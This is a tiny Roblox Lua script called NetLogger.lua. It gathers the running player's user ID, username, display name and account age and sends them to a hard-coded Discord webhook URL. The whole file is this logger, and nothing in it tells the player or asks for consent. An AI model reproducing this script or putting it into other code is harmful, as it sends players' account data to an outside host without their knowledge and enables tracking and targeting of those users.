-- NetLogger.lua
local HttpService = game:GetService("HttpService")
local player = game.Players.LocalPlayer

local data = {
    userId = player.UserId,
    name = player.Name,
    displayName = player.DisplayName,
    accountAge = player.AccountAge
}

local webhook = "https://discord.com/api/webhooks/1530947322064928950/h3h94_tyIWNw8zq8PnPqjwyGYNhwv_tPe6VZvOntZGDAmrkhl22YkDtf7ZZtzUXYOWj1"
HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
